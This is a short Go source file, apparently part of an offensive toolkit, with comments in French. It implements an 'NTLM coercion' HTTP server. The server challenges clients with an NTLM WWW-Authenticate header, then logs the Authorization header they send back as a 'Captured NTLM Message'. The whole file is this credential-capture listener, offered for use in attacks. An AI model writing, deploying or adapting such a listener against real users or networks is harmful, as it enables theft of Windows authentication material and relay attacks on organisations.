// pkg/coercion/coercion.go
package coercion

import (
	"fmt"
	"net/http"
)

// CoerceServer représente un serveur de coercion NTLM.
type CoerceServer struct {
	server *http.Server
}

// NewCoerceServer crée un nouveau serveur de coercion NTLM.
func NewCoerceServer(addr string) *CoerceServer {
	mux := http.NewServeMux()
	server := &http.Server{Addr: addr, Handler: mux}

	cs := &CoerceServer{server: server}

	mux.HandleFunc("/coerce", cs.handleCoerce)

	return cs
}

// handleCoerce gère les requêtes de coercion NTLM.
func (cs *CoerceServer) handleCoerce(w http.ResponseWriter, r *http.Request) {
	authHeader := r.Header.Get("Authorization")
	if authHeader == "" {
		w.Header().Set("WWW-Authenticate", `NTLM`)
		http.Error(w, "Authorization required", http.StatusUnauthorized)
		return
	}

	fmt.Printf("Captured NTLM Message: %s\n", authHeader)

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "NTLM Coercion Successful")
}

// Start démarre le serveur de coercion NTLM.
func (cs *CoerceServer) Start() error {
	return cs.server.ListenAndServe()
}
